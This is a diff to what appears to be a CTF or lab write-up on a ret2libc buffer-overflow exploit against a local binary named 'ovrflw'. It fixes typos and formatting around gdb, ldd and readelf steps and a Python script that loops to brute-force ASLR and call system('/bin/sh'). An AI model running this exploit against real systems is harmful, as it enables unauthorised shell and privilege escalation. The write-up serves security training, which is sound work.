@@ -92,11 +92,11 @@
 
 ![image](https://user-images.githubusercontent.com/123066149/228948867-48228b79-0142-4535-90d6-2d3629a51438.png)
 
-### get system address
+### Get system address
 
 ``p system``
 
-### check ASLR
+### Check ASLR
 
 ``ldd /usr/local/bin/ovrflw | grep libc`` 
 
@@ -110,7 +110,7 @@
 
 ![image](https://user-images.githubusercontent.com/123066149/228949395-2beecb7d-3929-44ec-855e-604195002920.png)
 
-### Finf exit address :
+### Find exit address :
 
 ``readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit``
 
@@ -126,7 +126,8 @@
 
 ![image](https://user-images.githubusercontent.com/123066149/228950185-e462d734-0323-4e7c-ba7a-6949d30c7bd1.png)
 
-``#!/usr/bin/python3
+
+#!/usr/bin/python3
 
 from struct import pack
 from subprocess import call
@@ -149,7 +150,12 @@ bin_sh_addr = pack("<L", base_libc_addr + bin_sh_addr_off)
 payload = junk + system_addr + exit_addr + bin_sh_addr
 
 while True:
-        ret = call(["/usr/local/bin/ovrflw", payload])``
-        
+        ret = call(["/usr/local/bin/ovrflw", payload])
+
+![image](https://user-images.githubusercontent.com/123066149/228951637-17575ac8-fadd-452c-85f2-dba0fdf82327.png)
+
         
 # ${{\color{purple}Point of Improvement}}\ $
+
+* Make a very good list with ``gobuster``
+
